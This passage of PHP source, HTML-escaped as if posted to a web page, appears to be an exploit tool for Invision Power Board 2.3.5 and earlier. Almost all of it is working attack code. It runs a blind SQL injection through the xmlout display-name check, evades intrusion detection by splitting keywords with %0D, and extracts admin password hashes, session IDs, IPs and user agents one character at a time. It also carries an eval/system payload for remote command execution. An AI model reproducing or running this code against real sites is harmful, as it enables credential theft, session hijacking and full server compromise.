/>&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_sel&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.admin_id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_end&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= '&quot;';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_bchar&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= -4; # &quot;;&#125;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_all;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'a_pwd_like'&#93;= $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_user_sess&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'user_sid';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'sessions';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.member_id=m.id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_sel&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.running_time';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_md5;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'u_sess_id'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_user_ip&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'user_ip';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'sessions';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.ip_address';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.member_id=m.id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_sel&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.running_time';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_ip;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'u_ip_addr'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_user_agent&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'user_agent';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'sessions';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.browser';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.member_id=m.id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_sel&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.running_time';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_all;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'u_agent'&#93;&nbsp; &nbsp;= $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function init_sql&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;# SQL Injection params<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_end&nbsp; &nbsp;= null;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_add_0 = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_add_1 = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_sel&nbsp; &nbsp;= '1';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_bchar = 0;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp;= '';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_add_1 = 'ORDER BY id DESC LIMIT 1';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function init_global&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Charsets<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;chr_spe = str_split&#40;' :/;*&#40;-.!,?В§*ВµГ№%$ВЈ^ВЁ=+&#125;&#41;В°&#93;Г Г§^_\\`ГЁ|&#91;\'&#123;#Г©~&amp;ВІ&quot;@'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;chr_num = range&#40;0, 9&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;chr_md5 = array_merge&#40; $this-&gt;chr_num, range&#40;'a', 'f'&#41; &#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;chr_ip&nbsp; = array_merge&#40; $this-&gt;chr_num, array&#40;'.'&#41; &#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;chr_all = array_merge&#40; $this-&gt;chr_num, range&#40;'a', 'z'&#41; &#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;chr_all = array_merge&#40; range&#40;'A', 'Z'&#41;, $this-&gt;chr_all, $this-&gt;chr_spe &#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;# SQL Injection<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;def_param = 'index.php?s=&amp;act=xmlout&amp;do=check-display-name&amp;name=%rep_inj%';<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# IDS Evasion via %0D<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;def_inj&nbsp; &nbsp;= &quot;' OR 1=\&quot;'\&quot; U%0DNION %rep_req% OR 1=\&quot;'\&quot; %rep_add% #&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Results<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data = array&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;conf = array&#40;'ip' =&gt; '', 'browser' =&gt; '', 'xforward' =&gt; ''&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Misc<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;stat&nbsp; &nbsp; &nbsp;= array&#40;-1 =&gt; '-', 0 =&gt; '/', 1 =&gt; '+'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_bypass = false;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;res_sep&nbsp; = md5&#40;rand&#40;&#41;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;def_ip&nbsp; &nbsp;= rand&#40;0,255&#41;.'.'.rand&#40;0,255&#41;.'.'.rand&#40;0,255&#41;.'.'.rand&#40;0,255&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# PHP Code<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;php_write = '$&#123;$&#123;@eval&#40;$_SERVER&#91;HTTP_MY_CODE&#93;&#41;&#125;&#125;';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;php_send&nbsp; &nbsp; = &quot;print&#40;'$this-&gt;res_sep'&#41;;@system&#40;base64_decode&#40;'%CMD%'&#41;&#41;;&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;php_send .= &quot;print&#40;'$this-&gt;res_sep'&#41;;exit&#40;0&#41;;&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Regex<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;reg_lang = '#&lt;/span&gt;&lt;/td&gt;&#91;\r\n&#93;*.*&#91;\r\n&#93;*.*code=export&amp;id=&#40;&#91;0-9&#93;+&#41;#i';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;reg_lvar = &quot;#id='XX_&#40;&#91;\w&#93;+&#41;'&#91;\x20&#93;+class='multitext'&gt;&#40;.*&#41;&lt;/textarea&gt;&lt;/td&gt;#i&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;reg_cpre = '#^&#40;.*&#41;session_id$#';<br />&nbsp; &nbsp;&nbsp; &nbsp;# $this-&gt;reg_acp&nbsp; = '#&lt;a href=&quot;&#40;.*&#41;&quot;&#91;\x20&#93;+target=&quot;_blank&quot;#i';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Default client headers<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_agent = 'Mozilla Firefox';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_ip&nbsp; &nbsp; = $this-&gt;def_ip;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function bf_inj&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;sub_chr = $this-&gt;t_bchar;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;key_val = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !empty&#40;$this-&gt;t_key&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;while&#40; true &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;t_bchar &lt; 0 &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;sub_chr--;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;sub_chr++;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 0-9a-f<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;for&#40; $j=0;$j&lt;=count&#40;$this-&gt;t_char&#41;;$j++ &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# That one ?<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$chr = $this-&gt;t_char&#91;$j&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Latest char ?<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $j === count&#40;$this-&gt;t_char&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$chr = $this-&gt;t_end;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Ascii num<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$asc = ord&#40;$chr&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Screen bug<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !empty&#40;$this-&gt;t_key&#41; &#41; <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$msg&nbsp; = $this-&gt;t_key.'='.$this-&gt;key_val;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$msg .= &#40;$chr === $this-&gt;t_end ? &quot;\x20&quot; : $chr&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;$msg, 0, 1, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Focus on the target ?<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !empty&#40;$this-&gt;t_join&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$inj = <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;'SEL%0DECT 1,'.$this-&gt;t_sel.' FR%0DOM '.$this-&gt;p_pre.$this-&gt;t_table.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;' t, '.$this-&gt;p_pre.'members m WH%0DERE '.$this-&gt;t_join.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;' AND m.'.$this-&gt;t_on.' AND ASC%0DII&#40;SUBS%0DTR&#40;'.$this-&gt;t_field.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;','.$this-&gt;sub_chr.',1&#41;&#41;='.$asc.' '.$this-&gt;t_add_0;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$inj =<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;'SEL%0DECT 1,'.$this-&gt;t_sel.' FR%0DOM '.$this-&gt;p_pre.$this-&gt;t_table.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;' t WH%0DERE ASC%0DII&#40;SUB%0DSTR&#40;'.$this-&gt;t_field.','.$this-&gt;sub_chr.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;',1&#41;&#41;='.$asc.' '.$this-&gt;t_add_0;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# SQL Injection via rawurldecode&#40;&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$inj = str_replace&#40;'%rep_req%', $inj, $this-&gt;def_inj&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$inj = str_replace&#40;'%rep_add%', $this-&gt;t_add_1, $inj&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$inj = str_replace&#40;array&#40;'&quot;', &quot;'&quot;&#41;, array&#40;'%2522', '%2527'&#41;, $inj&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Params<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$inj = str_replace&#40;'%rep_inj%', $inj, $this-&gt;def_param&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$inj = str_replace&#40;array&#40;' ', '#'&#41;, array&#40;'%20', '%23'&#41;, $inj&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;get&#40;$this-&gt;p_url.$inj&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Ok !?<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !strstr&#40;$this-&gt;web-&gt;getcontent&#40;&#41;, 'notfound'&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $chr !== $this-&gt;t_end &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;key_val .= $chr;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# End<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $chr === $this-&gt;t_end &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Reverse<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;t_bchar &lt; 0 &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;key_val = strrev&#40;$this-&gt;key_val&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !empty&#40;$this-&gt;t_key&#41; &#41; <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;$this-&gt;t_key.'='.$this-&gt;key_val, 1, 1, 1&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_p&#40;$p, $exit=false&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;global $argv;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40; $argv as $key =&gt; $value &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $value === '-'.$p &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; isset&#40;$argv&#91;$key+1&#93;&#41; &amp;&amp; !empty&#40;$argv&#91;$key+1&#93;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return $argv&#91;$key+1&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $exit &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;usage&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return true;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $exit &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;usage&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return false;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function msg&#40;$msg, $nstatus, $nspace=1, $ndel=0, $ask=false&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $ndel &#41; $type = &quot;\r&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;else&nbsp; &nbsp; &nbsp; &nbsp; $type = &quot;\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# wtf &#40;:<br />&nbsp; &nbsp;&nbsp; &nbsp;print<br />&nbsp; &nbsp;&nbsp; &nbsp;&#40;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$type.str_repeat&#40;&quot;\x20&quot;, $nspace&#41;.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;stat&#91;$nstatus&#93;.&quot;\x20&quot;.$msg<br />&nbsp; &nbsp;&nbsp; &nbsp;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $ask &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;return trim&#40;fgets&#40;STDIN&#41;&#41;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function give_hope&#40;&#41;<br />&nbsp; &nbsp;&#123;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'You should try with another user or try another time', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function mhead&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Advisory: http://acid-root.new.fr/?0:18<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n Invision Power Board &lt;= 2.3.5 Multiple Vulnerabilities&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n ------------------------------------------------------&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n\n About:&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n\n by DarkFig &lt; gmdarkfig &#40;at&#41; gmail &#40;dot&#41; com &gt;&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n http://acid-root.new.fr/&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n #acidroot@irc.worldnet.net&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n\n\n Attack&#40;s&#41;:\n&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function usage&#40;&#41;<br />&nbsp; 